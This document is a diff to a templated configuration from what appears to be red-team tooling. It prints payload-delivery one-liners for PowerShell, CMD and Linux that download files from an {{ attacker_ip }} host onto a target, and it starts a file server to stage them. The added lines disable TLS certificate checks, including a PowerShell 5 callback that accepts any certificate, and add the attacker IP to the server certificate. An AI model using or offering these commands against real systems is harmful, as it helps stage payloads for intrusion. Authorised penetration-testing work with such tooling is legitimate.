@@ -9,7 +9,8 @@ content: |
   mkdir -p packstation/outbound; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                      -----PowerShell-----                      '; \
-  printf '%s\n' 'Deliver: iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/FILE -Outfile {{ delivery_path_windows }}\FILE'; \
+  printf '%s\n' 'Deliver (PS 6+): iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/FILE -Outfile {{ delivery_path_windows }}\FILE -SkipCertificateCheck'; \
+  printf '%s\n' 'Deliver (PS 5): [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$$true}; iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/FILE -Outfile {{ delivery_path_windows }}\FILE'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                         -----CMD-----                          '; \
   printf '%s\n' 'Deliver: powershell wget -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/FILE -Outfile {{ delivery_path_windows }}\FILE'; \
@@ -17,4 +18,4 @@ content: |
   printf '%s\n' '                       -----Linux------                         '; \
   printf '%s\n' 'Deliver: curl {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/FILE -o {{ delivery_path_linux }}/FILE'; \
   printf '%s\n' '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }} {{ delivery_tls_flag }}
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }} {{ delivery_tls_flag }} --san {{ attacker_ip }}
